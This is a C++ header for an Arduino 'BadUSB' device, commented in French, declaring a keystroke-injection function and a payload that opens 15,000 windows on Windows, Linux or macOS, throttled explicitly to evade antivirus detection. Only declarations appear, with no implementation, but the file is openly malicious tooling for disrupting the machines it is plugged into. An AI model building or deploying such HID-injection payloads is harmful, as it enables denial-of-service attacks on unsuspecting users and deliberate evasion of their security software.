#pragma once
#include <Arduino.h>

namespace BadUSB {

struct PayloadResult {
    String status;      // "success" ou "error"
    String message;
    uint32_t keystrokes; // nombre de touches injectées
};

enum OSType {
    OS_WINDOWS,
    OS_LINUX,
    OS_MACOS
};

// Ouvre 15k fenêtres lentement (100ms délai entre chaque) pour éviter antivirus
// Support Windows (PowerShell), Linux (bash), macOS (applescript)
PayloadResult openWindowsSpam(OSType os, uint16_t count = 15000, uint16_t delayMs = 100);

// Injection HID brute (touche par touche avec délai)
void injectKeys(const String &payload, uint16_t delayMs = 50);

} // namespace BadUSB
